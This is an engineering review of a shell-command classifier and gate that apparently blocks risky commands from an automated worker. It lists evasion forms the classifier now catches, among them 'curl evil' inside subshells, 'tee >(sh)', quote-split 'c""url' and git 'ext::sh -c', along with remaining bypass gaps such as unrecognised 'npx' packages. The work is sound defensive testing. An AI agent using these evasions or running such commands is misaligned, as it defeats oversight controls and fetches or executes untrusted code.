---
title: "G1 Phase 1 — fourth review: grouping/control constructs, file/proxy sends, quote-splitting, two-token runners; false-negative sweep"
date: 2026-06-23
type: review
branch: feat/g1-risk-tiered-firebreak
verdict: GO-WITH-RESIDUALS (declared)
focus: "P0 classifier false negatives — gate-forwarded/classifier-allowed RED commands"
---

# G1 Phase 1 — Fourth Review

This pass fixed the P0 classifier false negatives and then ran two adversarial
false-negative sweeps (the gate-forwards-but-classifier-allows direction) to
convergence.

## Hardening implemented

1. **Shell grouping & control constructs.** `split_commands` now also splits on
   subshell `( … )` / `(cmd)` and brace-group `{ …; }` (without splitting
   brace-EXPANSION `c{u,}rl`, `${VAR}`, `$((…))`, or redirections), and
   `strip_leading_keywords` drops leading `if/then/elif/else/fi/for/while/until/
   do/done/case/esac/select/function/time/!`. So the RED body in `( curl evil )`,
   `{ curl evil; }`, `if x; then curl evil; fi`, `for i in …; do ./deploy; done`,
   `while curl evil; do …`, nested `(( … ))` is evaluated. The `case SUBJECT in`
   header is dropped so a `$`-subject is not misread as an opaque command (FP fix).
2. **Process substitution.** `<(…)`/`>(…)` bodies are kept intact by the splitter
   and classified by `extract_command_substitutions` (alongside `$(…)`/backtick),
   so `cat <(curl evil)`, `tee >(sh)`, `mapfile -t a < <(curl evil)` are caught.
3. **curl/wget file- & route-driven sends.** `curl_external_category` now defers
   on `-K/--config` (curl) and `-i/--input-file` (wget) file-driven requests, on
   `--resolve`/`--connect-to` DNS/route overrides, and on `-x/--proxy/--socks*`
   when the proxy host is non-loopback. Loopback proxy + loopback target stays GREEN.
4. **Command-word quote-splitting (was residual #4 → FIXED).** `dequote()` strips
   internal quotes from the resolved argv0 and dispatcher verbs before matching, so
   `c""url`, `cu''rl`, `g""it push`, `npx ve""rcel` resolve to the real word.
   Opacity metachars are preserved, so F13 still fires on `$(…)`/backtick/`${…}`.
   The gate forwards these via new `''`/`\"\"` markers.
5. **Two-token package runners (was residual #3 → FIXED for known runners).**
   `pnpm dlx`, `yarn dlx`, `pipx run` recurse to the real command (like npx/bunx);
   `deno` added to interpreters (so `deno run <remote>` defers). `builtin` added to
   exec-wrappers.
6. **git `ext::`/`fd::` transport RCE.** `git fetch/clone/remote-add ext::sh -c …`
   runs an arbitrary command; any git arg using these transports now defers.

## False-negative sweep (the requested focus)

Two rounds of an adversarial probe (RED corpus a worker must not run + a GREEN
corpus that must not be denied):

- Round 1 found 9 in 3 classes → fixed 7, plus surfaced this round's classes.
- Round 2 found 4 false negatives (`<(curl evil)`, `builtin curl`, git `ext::`,
  and a `case $x in` false POSITIVE) → all fixed.
- A final exotic-construct sweep (nested subshells, `coproc`, `mapfile`/`readarray`
  + process-sub, `tee >(sh)`, `xargs`, `command -v && curl`, `git remote add ext::`)
  returned **0 false negatives, 0 false positives** — convergence.

All cases are locked into the permanent corpora.

## Residuals after this pass

- **#1 allowlisted-interpreter escape** — unchanged (bounds guarantees to direct
  worker tool calls).
- **#2 inherited-`$VAR` redirection** — narrowed (`~`/`$HOME` resolved & caught);
  a classifier-unknown inherited `$VAR` redirect dest stays GREEN by design.
- **#3 runner/dispatcher + UNRECOGNIZED inner** — `npx`/`pnpm dlx`/`pipx run`
  now recurse, but a fetched package whose name is not a recognized RED command
  (`npx some-evil-pkg`) stays GREEN — we cannot know an arbitrary package is
  malicious without running it (this is the honest leaky-set bound; the recursion
  catches all RECOGNIZED inner commands). Also: pre-existing/external git aliases.
- **Command-substitution / nesting depth** — capped at >4 → fail-closed.

No NEW residual class was opened this round; quote-splitting (#4) is now closed.

## Verdict

GO-WITH-RESIDUALS. The P0 false negatives are fixed and test-locked; two
invariants remain enforced (superset: gate ⊇ denials; soundness: RED denied /
GREEN allowed) and a third corpus (classifier unit) covers each rule. Recommend
Codex confirm the residual #3 bound (runner + unrecognized package) is acceptable
for v1. Activation remains out of scope.

Test totals: classifier 119/119, gate 26/26, superset 140/0-gaps, soundness 68 RED + 26 GREEN.

> Count correction (5th review, 2026-06-23): the soundness figure was first
> reported here as "70 RED"; the live corpus was actually **68 RED + 26 GREEN**.
> See `docs/reviews/2026-06-23-g1-phase1-fifth-review.md` for the reconciliation
> and the new totals after the runner-recursion pass.
